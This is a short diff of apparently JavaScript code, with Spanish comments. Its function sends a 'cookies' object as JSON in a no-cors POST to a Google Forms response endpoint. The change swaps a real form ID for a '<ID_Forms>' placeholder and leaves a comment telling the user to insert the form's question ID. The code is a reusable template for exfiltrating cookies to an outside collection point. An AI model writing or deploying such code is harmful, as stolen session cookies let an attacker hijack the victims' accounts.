@@ -27,7 +27,7 @@ function enviarCookieAFormulario(cookies)
 
     const formData = new URLSearchParams();
     formData.append("entry.xxxxxxxxxx", JSON.stringify(cookies)); //se debe colocar el ID de la pregunta del formulario
-    fetch("https://docs.google.com/forms/d/e/1FAIpQLSf17-uklr7YuJVTGafTb4MNJgTn9syTt2ZqEm9QPogYO7dSiA/formResponse", {
+    fetch("https://docs.google.com/forms/d/e/<ID_Forms>/formResponse", {
         method: "POST",
         body: formData,
         mode: "no-cors",
